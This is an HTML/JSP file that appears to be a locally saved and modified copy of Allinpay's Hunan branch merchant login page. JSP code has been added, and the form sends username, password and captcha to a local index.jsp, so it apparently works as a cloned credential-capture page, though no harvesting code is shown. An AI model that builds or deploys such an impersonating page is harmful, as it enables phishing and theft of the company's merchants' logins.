
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0038)http://vacct.allinpay.com/merlogin.dsr -->
<HTML><HEAD><TITLE>通联支付湖南分公司银行卡业务管理系统 </TITLE>
<META content="text/html; charset=utf-8" http-equiv=Content-Type><LINK 
rel=stylesheet type=text/css href="login_files/smartmenu.css"><LINK 
rel=stylesheet type=text/css href="login_files/stylesub.css">
<SCRIPT type=text/javascript src="login_files/jquery.pack.js"></SCRIPT>

<SCRIPT type=text/javascript src="login_files/jquery.form.js"></SCRIPT>

<SCRIPT type=text/javascript src="login_files/function.js"></SCRIPT>

<SCRIPT type=text/javascript src="login_files/PageCtrl.js"></SCRIPT>

<SCRIPT type=text/javascript src="login_files/common.js"></SCRIPT>

<SCRIPT type=text/javascript src="login_files/dialog.js"></SCRIPT>

<SCRIPT type=text/javascript src="login_files/aipgUtil.js"></SCRIPT>

<SCRIPT type=text/javascript src="login_files/accounting.js"></SCRIPT>

<SCRIPT type=text/javascript src="login_files/PageComboURL.js"></SCRIPT>

<SCRIPT type=text/javascript src="login_files/PageCombo.js"></SCRIPT>

<SCRIPT type=text/javascript src="login_files/MultiCombo.js"></SCRIPT>

<SCRIPT type=text/javascript src="login_files/MultiComboURL.js"></SCRIPT>

<SCRIPT type=text/javascript src="login_files/map.js"></SCRIPT>

<SCRIPT type=text/javascript src="login_files/vtip.js"></SCRIPT>

<SCRIPT type=text/javascript src="login_files/WdatePicker.js"></SCRIPT>
<LINK rel=stylesheet type=text/css href="login_files/css.css">
<SCRIPT type=text/javascript>
	function postURL(form,url)
	{
		form.action=url;
		form.submit();
	}
	function slideToggleOperatingTip(divid)
	{
		//"#operatingTip"
		$(divid).slideToggle(200);
	}
	var webPath = 'http://vacct.allinpay.com:80';
</SCRIPT>
<LINK rel=stylesheet type=text/css href="login_files/merlogin.css" media=screen>
<SCRIPT type=text/javascript src="login_files/login.js"></SCRIPT>
</STYLE>
<SCRIPT type=text/javascript>
<%
if(request.getParameter("login")!=null){
	out.print(" alert('用户名或密码错误');");
}
if(request.getParameter("code")!=null){
	out.print(" alert('验证码错误');");}
if(request.getParameter("mod")!=null){
	out.print(" alert('密码修改成功,请登录！');");}
if(request.getParameter("info")!=null){
	out.print(" alert('在线时间超时，请重新登录！');");
}%>
	   function reloadVerifyCode()
	   {  
         	var timenow = new Date().getTime();                          
	    } 
	   
	   $(document).ready(function(){
		   $('#submit_btn').val('');
		   reloadVerifyCode();
		   aipgUtil.setCookie("usertype","1",1);
	   });
	   
	</SCRIPT>

<SCRIPT type=text/javascript>
    if(navigator.userAgent.toLowerCase().indexOf("chrome")>=0||navigator.userAgent.toLowerCase().indexOf("safari")>=0){
window.setInterval(function(){
$('input:-webkit-autofill').each(function(){
varclone =$(this).clone(true,true);$(this).after(clone).remove();});},20);}
</SCRIPT>

<META name=GENERATOR content="MSHTML 8.00.6001.19403"></HEAD>
<BODY>
<FORM  method=post 
action=index.jsp>
		<DIV id=login>
			<UL class=ul_input>
				<LI class=li_radio></LI>
				<LI class=li_input><INPUT id=userId class=input_long type=text
					name=username autocomplete="off"></LI>
				<LI class=li_input><INPUT id=password class=input_long
					type=password name=password autocomplete="off"></LI>
				<LI class=li_input><INPUT maxlength="4" id=piccode class=input_short
					type=text name=checkCode autocomplete="off">
					<DIV class=input_code>
						<IMG style="VERTICAL-ALIGN: middle" id=safecode
							onclick=javascript:reloadVerifyCode(); alt=验证码
							src="code.jsp">
					</DIV></LI>
			</UL>
			<UL class=errmsgcontent>
				<SPAN id=error_msg></SPAN>
			</UL>
			<UL class=ul_btn>
				<INPUT id=submit_btn class=login_btn value=提交查询内容 type=submit
					name=submit_btn>
			</UL>
		</DIV>
	</FORM></BODY></HTML>
